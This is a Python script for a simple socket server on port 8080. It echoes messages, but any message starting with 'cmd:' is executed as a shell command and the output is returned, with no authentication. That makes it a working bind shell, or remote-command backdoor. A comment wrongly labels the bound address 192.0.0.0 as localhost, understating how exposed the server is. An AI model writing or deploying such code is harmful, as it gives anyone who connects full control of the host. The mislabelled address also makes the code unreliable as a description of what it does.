import socket
import subprocess

host = '192.0.0.0'  # localhost
port = 8080

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address
server_socket.bind((host, port))

# Listen for incoming connections
server_socket.listen(5)

print("Server listening on {}:{}".format(host, port))

# Accept incoming connections
client_socket, client_address = server_socket.accept()

print("Connection from:", client_address)


def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True)
        return result.decode()
    except Exception as e:
        return str(e)


while True:
    # Receive data from the client
    data = client_socket.recv(1024).decode().strip()

    # If the client sends "exit", close the connection
    if data.lower() == "exit":
        print("Client disconnected.")
        break

    # Check if the message is a command
    if data.startswith("cmd:"):
        command = data.split(":", 1)[1]
        response = execute_command(command)
        client_socket.sendall(response.encode())
    else:
        # Echo the received message back to the client
        client_socket.sendall(data.encode())

# Close the connection
client_socket.close()
